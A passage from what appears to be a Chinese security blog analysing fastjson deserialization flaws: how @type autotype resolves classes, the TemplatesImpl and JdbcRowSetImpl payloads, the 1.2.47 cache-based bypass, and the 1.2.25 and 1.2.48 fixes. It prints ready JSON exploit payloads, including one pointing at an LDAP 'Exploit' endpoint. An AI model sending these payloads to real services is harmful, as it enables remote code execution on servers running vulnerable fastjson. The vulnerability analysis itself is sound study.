&#125;</span><br><span class="line">        propertyName = getPropertyNameByCompatibleFieldName(fieldCacheMap, methodName, propertyName, <span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c3 == <span class="string">'_'</span>)&#123;</span><br><span class="line">        propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">        field = fieldCacheMap.get(propertyName);</span><br><span class="line">        <span class="keyword">if</span> (field == <span class="keyword">null</span>) &#123;</span><br><span class="line">            String temp = propertyName;</span><br><span class="line">            propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">            field = ParserConfig.getFieldFromCache(propertyName, fieldCacheMap);</span><br><span class="line">            <span class="keyword">if</span> (field == <span class="keyword">null</span>) &#123;</span><br><span class="line">                propertyName = temp; <span class="comment">//减少修改代码带来的影响</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c3 == <span class="string">'f'</span>)&#123;</span><br><span class="line">        propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(methodName.length() &gt;= <span class="number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">4</span>)))&#123;</span><br><span class="line">        propertyName = decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">        field = ParserConfig.getFieldFromCache(propertyName, fieldCacheMap);</span><br><span class="line">        <span class="keyword">if</span> (field == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到规则是跟取 setter 类似的, 就是方法名开头从 set 改成 get.  </p><p>总结一下有 <code>@type</code> 的反序列化大致流程  </p><ol><li>parse 到 key = @type, 将 value 作为 class</li><li>反射出类的构造器, 方法, 等</li><li>若不是一些内置包装类或者特殊类 + 存在默认构造器, 那么调用 JavaBeanInfo.build 得到 getter, setter, 属性的信息</li><li>继续扫描 json, 若有对应的 key 可以找到 setter 或者属性, 就调用 setter 或者直接赋值给属性</li></ol><p>另外 autotype 是可以嵌套的, 比如可以</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"xxx.xxx"</span>,</span><br><span class="line">        <span class="attr">"xxx"</span>: <span class="string">"xxx"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"xxx.xxx"</span>,</span><br><span class="line">        <span class="attr">"xxx"</span>: &#123;</span><br><span class="line">            <span class="attr">"@type"</span>: <span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"xxx"</span></span><br><span class="line">    &#125; : <span class="string">"xx"</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>作为 array 里面的元素, object 的 value 都是可以的, 甚至可以作为 key, 会调用 <code>toString</code> 方法作为 JSONObject 的 key.  </p><p>所以看了反序列化的流程, 那么挖掘反序列化漏洞, 可以重点看  </p><ol><li>无参构造器</li><li>public 单参数 setter</li><li>返回值类型继承 Map, Collection 或者是 AtomicXxxx 的无参 getter 方法</li><li>toString</li><li>如果是手动调用的 parseObject, 那么 getter 的范围可以扩大</li></ol><h2 id="TemplateImpl-POC-分析"><a href="#TemplateImpl-POC-分析" class="headerlink" title="TemplateImpl POC 分析"></a>TemplateImpl POC 分析</h2><p>JdbcRowSetImpl 的 POC 比较简单, 一开始就已经分析好了. TemplateImpl 相对比较复杂, 有很多用到了 fastjson 的一些特性, 比如</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="attr">"_bytecodes"</span>:[<span class="string">"yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQE...."</span>],<span class="attr">"_name"</span>:<span class="string">"a.b"</span>,<span class="attr">"_tfactory"</span>:&#123; &#125;,<span class="attr">"_outputProperties"</span>:&#123; &#125;,<span class="attr">"_version"</span>:<span class="string">"1.0"</span>,<span class="attr">"allowedProtocols"</span>:<span class="string">"all"</span>&#125;</span><br></pre></td></tr></table></figure><p>其中 _bytecodes 是 private 的, 能赋值成功需要目标开启 Feature.SupportNonPublicField (默认关闭) 才能强制将值赋给 private 的属性. 所以这个 payload 说实话还是图一乐, 估计也就 CTF 用的到.  </p><p>另外可以看到 _bytecodes 是 base64 过的, 因为 json 标准里面是不能直接序列化 binary 的, fastjson 对 byte[] 在反序列时会 base64 decode 一下.  </p><p>不同与上面的 payload 的是这里触发的就不是 setter 了, 而是我们特别提到过的特殊 getter. 这里是 _outputProperties</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.newTransformer().getOutputProperties();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (TransformerConfigurationException var2) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 Properties 继承于 Hashtable, 最后继承到 Map. 完美符合条件, 方法里面的 <code>newTransformer</code> 最后触发 defineTransletClasses, 导致实例化 bytecode, 最后 RCE.<br>这里 _outputProperties 匹配到 getOutputProperties 这个 getter 的原因是匹配时会把 key 里面的 _ 给全部替换为空 (估计是为了方便前端 js 下划线命名可以不用特意替换成驼峰命名), 具体代码分析可以看看底下推荐阅读的 3 号.<br>所以这里 payload 可以写成 outputProperties, 这个 _ 可有可无, 而且在扫描到 _outputProperties 就已经触发, 后面的属性也是多余的… 所以这个 payload 其实等价于</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="attr">"_bytecodes"</span>:[<span class="string">"yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQE...."</span>],<span class="attr">"_name"</span>:<span class="string">"anything"</span>,<span class="attr">"_tfactory"</span>:&#123; &#125;,<span class="attr">"outputProperties"</span>:&#123; &#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-25-修复"><a href="#1-2-25-修复" class="headerlink" title="1.2.25 修复"></a>1.2.25 修复</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.24</span></span><br><span class="line">Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</span><br><span class="line"><span class="comment">//1.2.25</span></span><br><span class="line">Class&lt;?&gt; clazz = config.checkAutoType(typeName);</span><br></pre></td></tr></table></figure><p>不再直接 Class.forName 了, 而是加上了不少限制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            String deny = denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        clazz = derializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">        String accept = acceptList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">            <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先是加了一个 Feature, 且默认关闭, 也就是说默认不支持 @type 这种反序列类的方法了. 而且就算打开了, 还有了黑名单, 直接 ban 掉了之前的那两个 payload 的类.</p><h2 id="1-2-47-绕过"><a href="#1-2-47-绕过" class="headerlink" title="1.2.47 绕过"></a>1.2.47 绕过</h2><p>在这之间也出现不少绕过, 但是需要手动开始 autoType, 可以看看推荐阅读的 4 号. 而 1.2.47 版本出现的这个绕过就比较牛逼, 不开始 autoType 这个 feature 也能打.</p><p>先看 payload </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"java.lang.Class"</span>, </span><br><span class="line">        <span class="attr">"val"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="attr">"b"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>, </span><br><span class="line">        <span class="attr">"dataSourceName"</span>: <span class="string">"ldap://localhost:1389/Exploit"</span>, </span><br><span class="line">        <span class="attr">"autoCommit"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看这个 <code>java.lang.Class</code>, 需要知道一点, fastjson 有很多对内置类的提前做好的反序列化器. 可以在 <code>com.alibaba.fastjson.parser.ParserConfig</code> 的 <code>initDeserializers</code> 的方法看到. 这个方法在类构造时就会被调用, 而其中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...省略</span></span><br><span class="line">deserializers.put(<span class="keyword">boolean</span>.class, BooleanCodec.instance);</span><br><span class="line">deserializers.put(Boolean.class, BooleanCodec.instance);</span><br><span class="line">deserializers.put(Class.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(<span class="keyword">char</span>[].class, <span class="keyword">new</span> CharArrayCodec());</span><br><span class="line"><span class="comment">//...省略</span></span><br></pre></td></tr></table></figure><p>在反序列化时会优先使用这些预定义好的反序列器, 如果不存在的话, 才会去调用 <code>createJavaBeanDeserializer</code>, 去读取目标类的 setter, getter, 属性等去反序列化.<br>而对于 Class.class, 反序列化方法是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Object objVal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">    parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">    parser.accept(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">"val"</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        lexer.nextToken();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parser.accept(JSONToken.COLON);</span><br><span class="line"></span><br><span class="line">    objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">    parser.accept(JSONToken.RBRACE);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    objVal = parser.parse();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String strVal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (objVal == <span class="keyword">null</span>) &#123;</span><br><span class="line">    strVal = <span class="keyword">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    strVal = (String) objVal;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// ... 省略</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... 省略</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">    <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到就是将 val 作为类名, 然后用 classloader 去 load 这个 class, 然后返回这个类的 Class 对象.<br>然后回到 fastjson </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123; <span class="comment">// &lt;-- 默认 autoType 关闭, expectClass = null 这一段可以无视</span></span><br><span class="line">    <span class="keyword">long</span> hash = h3;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">        hash ^= className.charAt(i);</span><br><span class="line">        hash *= PRIME;</span><br><span class="line">        <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点在 <code>deserializers.findClass(typeName);</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Class <span class="title">findClass</span><span class="params">(String keyString)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; buckets.length; i++) &#123;</span><br><span class="line">        Entry bucket = buckets[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bucket == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K, V&gt; entry = bucket; entry != <span class="keyword">null</span>; entry = entry.next) &#123;</span><br><span class="line">            Object key = bucket.key;</span><br><span class="line">            <span class="keyword">if</span> (key <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">                Class clazz = ((Class) key);</span><br><span class="line">                String className = clazz.getName();</span><br><span class="line">                <span class="keyword">if</span> (className.equals(keyString)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 bucket 就是 put 方法会存进去的 bucket, 所以这里因为是内置类, 其实等价于白名单, 所以直接返回了 clazz, autoType 即使关闭也是可以正常反序列化这些对象的. 比如 Integer, String, URL 等等内置常见对象的.  </p><p>而问题也是出在这里, 还记得 Class 的反序列化方式么, 会调用 <code>TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())</code>,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="keyword">boolean</span> cache) &#123;</span><br><span class="line">    <span class="keyword">if</span>(className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">    <span class="keyword">if</span>(clazz != <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">'['</span>)&#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>))&#123;</span><br><span class="line">        String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(classLoader != <span class="keyword">null</span>)&#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>注意 <code>mappings.put(className, clazz)</code>, 如果这个类存在, 会将其放入 TypeUtils 里面的这个缓存中.  </p><p>又回到 checkAutoType 中, 注意这个</p><p>com.alibaba.fastjson.parser.ParserConfig</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>com.alibaba.fastjson.util.TypeUtils</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className)&#123;</span><br><span class="line">    <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了在 deserializers 里面寻找, 还会在 TypeUtils 的缓存里面寻找, 而刚刚我们通过 Class 的反序列化方法, 将我们想要的类放入了缓存中. 这就到达了绕过的效果, 意味着就算我们关闭了 autoType, 照样可以进行利用, 漏洞的发现者 tql.  </p><p>这里的本意, 应该是加快速度, 毕竟如果你之前加载过这个类, 当然是在白名单里面的, 但是问题出现在 Class 的反序列器也会调用 loadClass, 这是开发者忘记掉的. 导致恶意类被放入了缓存中, 绕过了检测.  </p><h2 id="1-2-48-修复"><a href="#1-2-48-修复" class="headerlink" title="1.2.48 修复"></a>1.2.48 修复</h2><p>对应的修复</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 loadClass 的 cache 设为 false, 这样反序列 Class 对象的时候, 就不会将结果放入缓存中, 自然也就无法绕过 checkAutoType 了.</p><h2 id="本文参考-推荐阅读"><a href="#本文参考-推荐阅读" class="headerlink" title="本文参考/推荐阅读"></a>本文参考/推荐阅读</h2><p>[1] <a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a><br>[2] <a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html" target="_blank" rel="noopener">https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html</a><br>[3] <a href="https://kingx.me/Details-in-FastJson-RCE.html" target="_blank" rel="noopener">https://kingx.me/Details-in-FastJson-RCE.html</a><br>[4] <a href="https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/" target="_blank" rel="noopener">https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/</a>  </p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;先看经典 payload&lt;/p&gt;
